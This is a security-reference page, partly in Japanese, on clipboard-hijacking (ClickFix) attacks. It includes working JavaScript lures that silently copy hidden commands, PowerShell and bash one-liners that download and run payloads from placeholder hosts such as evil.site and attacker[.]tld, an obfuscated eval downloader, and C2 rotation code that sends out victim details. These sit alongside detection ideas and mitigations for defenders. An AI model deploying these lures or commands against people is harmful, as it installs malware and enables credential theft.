# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしていないものを貼り付けるな。」– 古いが今でも有効な助言

## 概要

Clipboard hijacking – also known as *pastejacking* – は、ユーザーがコマンドを検査せずに日常的にコピー＆ペーストすることを悪用します。悪意のあるウェブページ（または Electron やデスクトップアプリケーションなどの任意の JavaScript 実行可能なコンテキスト）は、プログラム的に攻撃者が制御するテキストをシステムのクリップボードに置きます。被害者は通常、精巧に作られたソーシャルエンジニアリングの指示によって **Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付け*させられ、即座に任意のコマンドが実行されます。

ファイルがダウンロードされず添付ファイルが開かれないため、**no file is downloaded and no attachment is opened** この手法は添付ファイルやマクロ、直接のコマンド実行を監視する多くのメール／ウェブコンテンツのセキュリティ制御を回避します。そのため、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer のような汎用マルウェアを配布するフィッシングキャンペーンでよく用いられます。

## JavaScript による概念実証 (Proof-of-Concept)
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake のフロー

1. ユーザーがタイポスクワットされた、または改ざんされたサイト（例: `docusign.sa[.]com`）を訪問する。
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64-encoded PowerShell のワンライナーをクリップボードに黙って格納する。
3. HTML の指示は被害者に次のように促す: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意ある DLL を含むアーカイブをダウンロードする（classic DLL sideloading）。
5. ローダーは追加のステージを復号化し、shellcode を注入して永続化（例: scheduled task）を行い、最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (正規の Java WebStart) はそのディレクトリ内で `msvcp140.dll` を検索する。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** を介して 2 つのバイナリ (`data_3.bin`, `data_4.bin`) をダウンロードし、ローリング XOR キー `"https://google.com/"` で復号化し、最終のシェルコードを注入して **client32.exe** (NetSupport RAT) を `C:\ProgramData\SecurityCheck_v1\` に展開する。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** を使って `la.txt` をダウンロードする
2. **cscript.exe** 内で JScript ダウンローダーを実行する
3. MSI payload を取得 → サイン済みアプリケーションの横に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus。

### Lumma Stealer を MSHTA 経由で
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK（回転する C2 を伴う）(PureHVNC)

一部の ClickFix キャンペーンはファイルダウンロードを完全に省略し、被害者に WSH 経由で JavaScript を取得して実行するワンライナーを貼り付けるよう指示し、それを永続化し、C2 を日替わりで回転させます。観測された例のチェーン：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- 実行時に反転される難読化された URL により、簡易的な検査を回避する。
- JavaScript は Startup LNK (WScript/CScript) を介して自身を永続化し、現在の日付に基づいて C2 を選択する – これにより rapid domain rotation が可能になる。

日付で C2s をローテーションするために使用される最小の JS フラグメント:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では、永続化を確立し RAT (e.g., PureHVNC) を取得するローダーを展開することが多い。しばしば TLS をハードコードされた証明書にピン留めし、トラフィックをチャンクする。

この亜種に特有の検出アイデア
- プロセスツリー: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- スタートアップの痕跡: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` が WScript/CScript を呼び出し、JS パスが `%TEMP%`/`%APPDATA%` の下にある。
- Registry/RunMRU とコマンドラインテレメトリに `.split('').reverse().join('')` や `eval(a.responseText)` を含むもの。
- 長いコマンドラインを使わずに大きな stdin ペイロードで長いスクリプトを供給するために、`powershell -NoProfile -NonInteractive -Command -` を繰り返し使用する。
- スケジュールされたタスクが、更新プログラム風のタスク/パス（例: `\GoogleSystem\GoogleUpdater`）の下でその後 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のような LOLBins を実行する。

Threat hunting
- 日次でローテーションする C2 ホスト名および `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` パターンの URL。
- クリップボード書き込みイベントに続いて Win+R による貼り付けがあり、直後に `powershell.exe` が実行される事象を相関付ける。

Blue-teams は clipboard、process-creation、registry テレメトリを組み合わせて pastejacking の濫用を突き止められる:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** コマンドの履歴を保持する — 異常な Base64 / 難読化されたエントリを探す。
* Security Event ID **4688** (Process Creation) で `ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } の場合。
* Event ID **4663** は、疑わしい 4688 イベントの直前に `%LocalAppData%\Microsoft\Windows\WinX\` または一時フォルダでのファイル作成があるかどうかを確認する。
* EDR の clipboard センサー（存在する場合） — `Clipboard Write` に続いて直ちに新しい PowerShell プロセスが起動する事象を相関させる。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近のキャンペーンは、偽の CDN/ブラウザ検証ページ（"Just a moment…", IUAM-style）を大量生産し、ユーザーにクリップボードから OS 固有のコマンドをネイティブコンソールへコピーさせることで強制する。これにより実行がブラウザサンドボックス外へピボットし、Windows と macOS 両方で動作する。

ビルダー生成ページの主な特徴
- `navigator.userAgent` による OS 検出でペイロードを調整（Windows PowerShell/CMD vs. macOS Terminal）。サポート外の OS にはデコイ/無操作を用意して欺きの演出を維持することがある。
- 表示されているテキストがクリップボードの内容と異なる場合でも、チェックボックス/Copy のような無害な UI 操作で自動的にクリップボードへコピーする。
- モバイルのブロックと、ステップバイステップの指示を示すポップオーバー: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter。
- オプションで難読化や単一ファイルインジェクタを使って、侵害されたサイトの DOM を Tailwind スタイルの検証 UI で上書きする（新しいドメイン登録は不要）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS の初回実行の永続化
- ターミナルが閉じた後でも実行が継続し、目に見える痕跡を減らすために `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使用する。

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAMスタイルのルアーに特化した検知およびハンティングのアイデア
- Web: ページが Clipboard API を検証ウィジェットにバインドしている; 表示されているテキストとクリップボードのペイロードが不一致; `navigator.userAgent` による分岐; 怪しいコンテキストで Tailwind + single-page の差し替え。
- Windows endpoint: ブラウザ操作直後に `explorer.exe` → `powershell.exe`/`cmd.exe` が発生する; `%TEMP%` から実行される batch/MSI インストーラ。
- macOS endpoint: ブラウザイベント付近で Terminal/iTerm が `bash`/`curl`/`base64 -d` を `nohup` 付きで起動する; ターミナル終了後も生き残るバックグラウンドジョブ。
- `RunMRU`（Win+R）の履歴とクリップボード書き込みを、その後のコンソールプロセス生成と相関させる。

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 緩和策

1. ブラウザの強化 – クリップボード書き込みアクセスを無効化（`dom.events.asyncClipboard.clipboardItem` 等）するか、ユーザージェスチャーを要求する。
2. セキュリティ意識向上 – ユーザーに機密性の高いコマンドは*手で入力*するか、まずテキストエディタに貼り付けて確認するよう教育する。
3. PowerShell Constrained Language Mode / Execution Policy と Application Control により任意のワンライナーをブロックする。
4. ネットワーク制御 – 既知の pastejacking やマルウェアの C2 ドメインへのアウトバウンドをブロックする。

## 関連トリック

* **Discord Invite Hijacking** は、ユーザーを悪意あるサーバーに誘導した後に同じ ClickFix アプローチを悪用することが多い:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 参考

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
